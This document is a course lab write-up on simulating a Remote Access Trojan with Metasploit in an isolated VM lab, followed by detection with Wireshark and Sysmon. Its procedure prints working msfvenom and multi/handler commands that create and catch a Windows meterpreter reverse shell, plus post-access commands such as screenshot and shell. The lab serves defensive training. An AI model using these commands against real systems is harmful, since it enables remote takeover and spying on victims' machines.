# Analyzing a Remote Access Trojan (RAT) in a Controlled Lab Environment

## Course  
CYB/510 – Enterprise Network Security

## Objective  
This lab demonstrates how a Remote Access Trojan (RAT) functions by simulating its behavior in a tightly controlled lab environment. The goal is to understand how RATs establish unauthorized access, and how such activity can be detected, monitored, and mitigated within an enterprise security context.

**Disclaimer:** This lab was performed in an isolated, offline test environment. No RAT code was deployed to or executed on any unauthorized system. This exercise is intended for educational and defensive training purposes only.

## Tools Used  
- Kali Linux (attacker system)  
- Windows 10 virtual machine (target system)  
- Metasploit Framework (for payload generation and control)  
- Wireshark or Sysmon (for detection and monitoring)  

## Procedure  

- On Kali Linux, generate a simulated reverse shell payload using `msfvenom`:
    ```bash
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe > rat-sim.exe
- Transfer the executable to the target Windows VM manually, ensuring it does not leave the lab
- Start Metasploit and set up a listener:
    ```bash
    msfconsole
    use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.1.100
    set LPORT 4444
    run
- On the target system, execute the payload:
    ```bash
    start rat-sim.exe
- Observe meterpreter session creation on the attack system
- Use basic meterpreter commands to simulate unauthorized access:
    ```bash
    sysinfo
    screenshot
    shell
- Monitor network activity with Wireshark and/or log changes with Sysmon on the Windows target

## Results
- RAT payload successfully established a reverse TCP connection to the attack system
- Meterpreter provided command-line access, process interaction, and screen capture
- Wireshark detected the outbound TCP connection from the target to the listener
- Sysmon logs showed the suspicious process creation and network behavior

## Lessons Learned
- Remote Access Trojans simulate persistent unauthorized control and are a major security risk
- Even simple payloads can bypass basic defenses if endpoint protection is not configured
- Detection and mitigation require layered defenses including behavior-based logging, EDR tools, and strong network segmentation
- Performing these tests in a controlled lab builds a practical understanding of real-world attack vectors


